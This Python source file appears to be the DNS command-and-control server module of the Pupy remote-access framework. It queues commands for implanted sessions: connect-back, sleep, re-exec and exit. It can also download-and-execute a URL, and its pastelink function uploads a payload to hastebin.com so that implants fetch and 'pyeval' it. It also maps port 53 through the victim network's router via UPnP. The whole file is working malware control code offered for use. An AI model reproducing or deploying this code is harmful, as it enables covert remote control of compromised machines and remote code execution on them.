# -*- coding: utf-8 -*-
import logging
from PupyCredentials import Credentials
from network.lib.picocmd.server import *
from network.lib.picocmd.picocmd import *
from Queue import Queue

from pupylib.PupyConfig import PupyConfig
from pupylib.utils.network import get_listener_ip, get_listener_port

import requests
import netifaces
import socket

from os import path

from network.lib.igd import IGDClient, UPNPError

class PupyDnsCommandServerHandler(DnsCommandServerHandler):
    def __init__(self, *args, **kwargs):
        if 'config' in kwargs:
            self.config = kwargs.get('config')
            del kwargs['config']
        else:
            self.config = None

        DnsCommandServerHandler.__init__(self, *args, **kwargs)

    def connect(self, hosts, port, transport, node=None, default=False):
        commands = [
            Connect(host, port, transport) for host in hosts
        ]

        applied = 0
        for command in commands:
            applied = self.add_command(command, session=node, default=default)

        return applied

    def disconnect(self, node=None, default=False):
        return self.add_command(Disconnect(), session=node, default=default)

    def reexec(self, node=None, default=False):
        return self.add_command(Reexec(), session=node, default=default)

    def sleep(self, timeout, node=None, default=False):
        return self.add_command(Sleep(timeout), session=node, default=default)

    def exit(self, node=None, default=False):
        return self.add_command(Exit(), session=node, default=default)

    def dexec(self, url, action, proxy=False, node=None, default=None):
        return self.add_command(
            DownloadExec(url, action=action, proxy=proxy),
            session=node, default=default
        )

    def pastelink(self, url, action, node=None, default=None):
        return self.add_command(
            PasteLink(url, action=action),
            session=node, default=default
        )

    def find_sessions(self, spi=None, node=None):
        if spi or node:
            results = []
            if self.config and node:
                if type(node) in (str,unicode):
                    nodes = []
                    for n in node.split(','):
                        try:
                            int(n, 16)
                            nodes.append(n)
                        except:
                            for tagged in self.config.by_tags(n):
                                nodes.append(tagged)

                    if nodes:
                        results = DnsCommandServerHandler.find_sessions(
                            self, node=','.join(nodes)
                        )
                    else:
                        results = []

            if spi:
                if type(spi) in (str,unicode):
                    spis = []
                    for s in spi.split(','):
                        try:
                            int(s, 16)
                            spis.append(s)
                        except:
                            pass

                    if spis:
                        results += DnsCommandServerHandler.find_sessions(
                            self, spi=','.join(spis)
                        )
        else:
            results = DnsCommandServerHandler.find_sessions(self)

        return results


class PupyDnsCnc(object):
    def __init__(
            self, igd=None, connect_host=None,
            recursor=None,
            connect_transport='ssl', connect_port=443,
            config=None, credentials=None
        ):

        credentials = credentials or Credentials()
        config = config or PupyConfig()

        self.config = config
        self.credentials = credentials
        self.igd = igd

        fdqn = self.config.get('pupyd', 'dnscnc').split(':')
        domain = fdqn[0]
        if len(fdqn) > 1:
            port = int(fdqn[1])
        else:
            port = 53

        listen = str(config.get('pupyd', 'address') or '0.0.0.0')
        prefer_external = config.getboolean('gen', 'external')

        self.host = [
            str(get_listener_ip(
                external=prefer_external,
                config=config,
                igd=igd
            ))
        ]
        self.port = get_listener_port(config, external=prefer_external)
        self.transport = config.get('pupyd', 'transport')

        recursor = config.get('pupyd', 'recursor')
        if recursor and recursor.lower() in ('no', 'false', 'stop', 'n', 'disable'):
            recursor = None

        self.dns_domain = domain
        self.dns_port = port
        self.dns_listen = listen
        self.dns_recursor = recursor
        self.handler = PupyDnsCommandServerHandler(
            domain,
            credentials['DNSCNC_PRIV_KEY'],
            recursor=recursor,
            config=self.config
        )

        self.server = DnsCommandServer(
            self.handler,
            address=listen,
            port=int(port)
        )

        if self.igd and self.igd.available:
            self.igd.AddPortMapping(53, 'UDP', int(port))
            self.igd.AddPortMapping(53, 'TCP', int(port))

        self.server.start()

    def stop(self):
        self.server.stop()

    def list(self, node=None):
        return self.handler.find_sessions(node=node) \
          or self.handler.find_sessions(spi=node)

    def connect(self, host=None, port=None, transport=None, node=None, default=False):
        return self.handler.connect(
            self.host if host is None else [ host ],
            self.port if port is None else port,
            self.transport if transport is None else transport,
            node=node,
            default=default
        )

    def disconnect(self, **kwargs):
        return self.handler.disconnect(**kwargs)

    def exit(self, **kwargs):
        return self.handler.exit(**kwargs)

    def sleep(self, *args, **kwargs):
        return self.handler.sleep(*args, **kwargs)

    def reexec(self, **kwargs):
        return self.handler.reexec(**kwargs)

    def reset(self, **kwargs):
        return self.handler.reset_commands(**kwargs)

    def dexec(self, *args, **kwargs):
        return self.handler.dexec(*args, **kwargs)

    def pastelink(self, content=None, url=None, action='pyeval', node=None, default=False):
        if not ( content or url ):
            raise ValueError('content and url args are empty')

        if content and url:
            raise ValueError('both content and url are selected')

        if content:
            content_path = path.expanduser(path.expandvars(content))
            if not path.exists(content_path):
                raise ValueError('no such file: {}'.format(content_path))

            payload = b''
            # TODO: add more providers
            with open(content_path) as content:
                payload = self.handler.encode_pastelink_content(content.read())

            response = requests.post('https://hastebin.com/documents', data=payload)
            if response.ok:
                key = response.json()['key']
                url = 'https://hastebin.com/raw/{}'.format(key)

        if not url:
            raise ValueError('couldn\'t create pastelink url')

        count = self.handler.pastelink(url, action, node=node, default=default)
        return count, url

    @property
    def policy(self):
        return {
            'interval': self.handler.interval,
            'timeout': self.handler.timeout,
            'kex': self.handler.kex,
        }

    def set_policy(self, *args, **kwargs):
        return self.handler.set_policy(*args, **kwargs)

    @property
    def dirty(self):
        count = 0
        for session in self.handler.find_sessions():
            if session.commands:
                count += 1
        return count

    @property
    def count(self):
        return len(self.handler.sessions)

    @property
    def commands(self):
        return self.handler.commands
